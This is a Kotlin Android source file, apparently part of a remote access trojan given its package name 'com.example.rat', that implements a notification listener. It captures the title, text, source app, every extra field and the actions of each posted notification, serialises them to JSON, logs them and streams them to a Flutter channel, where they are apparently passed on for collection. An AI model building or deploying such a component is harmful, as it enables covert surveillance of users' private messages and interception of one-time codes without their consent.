package com.example.rat

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.app.Notification
import org.json.JSONArray
import org.json.JSONObject
import io.flutter.plugin.common.EventChannel

class MyNotificationListener : NotificationListenerService() {
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val notification = sbn.notification
        val extras = notification.extras

        val title = extras?.getString(Notification.EXTRA_TITLE).orEmpty()
        val text =
            extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
        val packageName = sbn.packageName
        val time = sbn.postTime
        val actions = notification.actions?.mapNotNull { it.title?.toString() } ?: emptyList()

        val extrasJson = JSONObject()
        extras?.keySet()?.forEach { key ->
            val value = extras.get(key)
            extrasJson.put(key, value?.toString() ?: JSONObject.NULL)
        }

        val payload = JSONObject().apply {
            put("title", title)
            put("text", text)
            put("package", packageName)
            put("time", time)
            put("extras", extrasJson)
            put("actions", JSONArray(actions))
        }.toString()

        Log.d(TAG, payload)
        NotificationStreamHandler.send(payload)
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "Notification listener disconnected")
    }

    companion object {
        private const val TAG = "NotificationWatcher"
    }
}

object NotificationStreamHandler : EventChannel.StreamHandler {
    private var events: EventChannel.EventSink? = null

    override fun onListen(arguments: Any?, eventSink: EventChannel.EventSink?) {
        events = eventSink
    }

    override fun onCancel(arguments: Any?) {
        events = null
    }

    fun send(payload: String) {
        events?.success(payload)
    }
}

